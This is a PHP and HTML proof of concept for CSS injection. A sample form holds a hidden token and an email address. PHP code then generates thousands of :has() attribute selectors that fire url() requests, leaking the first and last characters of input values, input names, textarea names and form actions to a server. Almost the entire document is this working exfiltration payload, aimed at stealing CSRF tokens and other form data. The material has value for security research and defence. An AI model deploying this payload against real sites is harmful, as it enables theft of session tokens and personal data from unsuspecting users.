<form action="/blahblah" method="post">
<input type="hidden" name="mytoken" value="ddaf35a193617abacc417349ae204">
<input type="hidden" name="email" value="gareth.heyes@portswigger.net">
<textarea name=comment>blah blah</textarea>
</form>
<style>
<?php
define("MAX", 20);
define("MAX_FORMS", 4);
define("CHARS", array_merge(range(' ','@'),range('[','~')));

function escapeCSS($str) {
    return addcslashes($str, '\\"');
}

function discoverForms() {
    $css = '';
    for($i=1;$i<=MAX_FORMS;$i++) {
        $css .= 'html:has(form:nth-of-type('.$i.')){--formCount: url(/?formCount='.$i.');}'."\n";
    }
    foreach(CHARS as $chr) {
        for($i=1;$i<=MAX_FORMS;$i++) {
            $css .= 'html:has(form[action^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--form'.$i.'ActionBegins: url(/?form'.$i.'ActionBegins='.urlencode($chr).');}'."\n";
        }
        for($i=1;$i<=MAX_FORMS;$i++) {
            $css .= 'html:has(form[action$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--form'.$i.'ActionEnds: url(/?form'.$i.'ActionEnds='.urlencode($chr).');}'."\n";
        }
    }
    return $css;
}
function discoverTextareas() {
    $css = '';
    for($i=1;$i<=MAX;$i++) {
        $css .= 'html:has(textarea:nth-of-type('.$i.')){--textareaCount: url(/?textareaCount='.$i.');}'."\n";
    }
    foreach(CHARS as $chr) {
        for($i=1;$i<=MAX;$i++) {
            $css .= 'html:has(textarea[name^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--textarea'.$i.'NameBegins: url(/?input'.$i.'NameBegins='.urlencode($chr).');}'."\n";
        }
    }
    foreach(CHARS as $chr) {
        for($i=1;$i<=MAX;$i++) {
            $css .= 'html:has(textarea[name$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--textarea'.$i.'NameEnds: url(/?input'.$i.'NameEnds='.urlencode($chr).');}'."\n";
        }
    }
    return $css;
}
function discoverInputs() {
    $css = '';;
    for($i=1;$i<=MAX;$i++) {
        $css .= 'html:has(input:nth-of-type('.$i.')){--inputCount: url(/?inputCount='.$i.');}'."\n";
    }
    foreach(CHARS as $chr) {
        for($i=1;$i<=MAX;$i++) {
            $css .= 'html:has(input[value^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'ValueBegins: url(/?input'.$i.'ValueBegins='.urlencode($chr).');}'."\n";
        }
    }
    foreach(CHARS as $chr) {
        for($i=1;$i<=MAX;$i++) {
            $css .= 'html:has(input[value$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'ValueEnds: url(/?input'.$i.'ValueEnds='.urlencode($chr).');}'."\n";
        }
    }
    foreach(CHARS as $chr) {
        for($i=1;$i<=MAX;$i++) {
            $css .= 'html:has(input[name^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'NameBegins: url(/?input'.$i.'NameBegins='.urlencode($chr).');}'."\n";
        }
    }
    foreach(CHARS as $chr) {
        for($i=1;$i<=MAX;$i++) {
            $css .= 'html:has(input[name$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'NameEnds: url(/?input'.$i.'NameEnds='.urlencode($chr).');}'."\n";
        }
    }
    return $css;
}
function generateVariables() {
    $css = '';
    $rules = [];
    for($i=1;$i<=MAX_FORMS;$i++) {
        array_push($rules, 'var(--form'.$i.'ActionBegins,none)');
    }
    $css .= join(",", $rules);
    $css .= ',';
    $rules = [];
    for($i=1;$i<=MAX_FORMS;$i++) {
        array_push($rules, 'var(--form'.$i.'ActionEnds,none)');
    }
    $css .= join(",", $rules);
    $css .= ',';
    $rules = [];
    for($i=1;$i<=MAX;$i++) {
        array_push($rules, 'var(--input'.$i.'ValueBegins,none)');
    }
    $css .= join(",", $rules);
    $css .= ',';
    $rules = [];
    for($i=1;$i<=MAX;$i++) {
        array_push($rules, 'var(--input'.$i.'ValueEnds,none)');
    }
    $css .= join(",", $rules);
    $css .= ',';
    $rules = [];
    for($i=1;$i<=MAX;$i++) {
        array_push($rules, 'var(--input'.$i.'NameBegins,none)');
    }
    $css .= join(",", $rules);
    $css .= ',';
    $rules = [];
    for($i=1;$i<=MAX;$i++) {
        array_push($rules, 'var(--input'.$i.'NameEnds,none)');
    }
    $css .= join(",", $rules);
    $css .= ',';
    $rules = [];
    for($i=1;$i<=MAX;$i++) {
        array_push($rules, 'var(--textarea'.$i.'NameBegins,none)');
    }
    $css .= join(",", $rules);
    $css .= ',';
    $rules = [];
    for($i=1;$i<=MAX;$i++) {
        array_push($rules, 'var(--textarea'.$i.'NameEnds,none)');
    }
    $css .= join(",", $rules);
    return $css;
}
        echo discoverForms();
        echo discoverTextareas();
        echo discoverInputs();
        ?>    
        html {
            background:var(--inputCount,none),var(--formCount,none),var(--textareaCount,none),
            <?php
            echo generateVariables() . ";";
            ?>
        }
</style>